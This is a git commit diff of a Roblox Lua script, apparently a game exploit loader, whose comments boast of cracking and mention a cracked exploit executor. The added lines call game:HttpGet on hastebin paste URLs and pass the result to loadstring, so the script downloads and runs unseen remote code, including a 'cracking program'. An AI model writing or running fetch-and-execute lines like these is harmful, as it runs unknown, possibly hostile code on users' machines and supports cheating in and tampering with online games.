517181aaa21b98d85995356ced86a1a761c64f0f
lome4 <83579891+lome4@users.noreply.github.com>
2021-12-08 22:36:38 +0000

    Update ultraspecloadstring.lua

--- ultraspecloadstring.lua
+++ ultraspecloadstring.lua
@@ -1,5 +1,17 @@
--- cracked by best crackhead
--- purple aki sponsors this!
+--[[
+cracked by best crackhead
+purple aki sponsors this!
+lome4 excess
+powerpoint fps
+synapsex3.0cracked
 
--- Loadstring, on hastebin for anomyitity
+Loadstring, on hastebin for anomyitity
+]]
+
+-- Load the cracking program:
+loadstring(game:HttpGet("https://www.toptal.com/developers/hastebin/raw/zoyajifugu"))()
+
+wait(10) -- let the cracking program begin
+
+-- ultraspec loadstringified:
 loadstring(game:HttpGet("https://www.toptal.com/developers/hastebin/raw/cogusakidi"))()
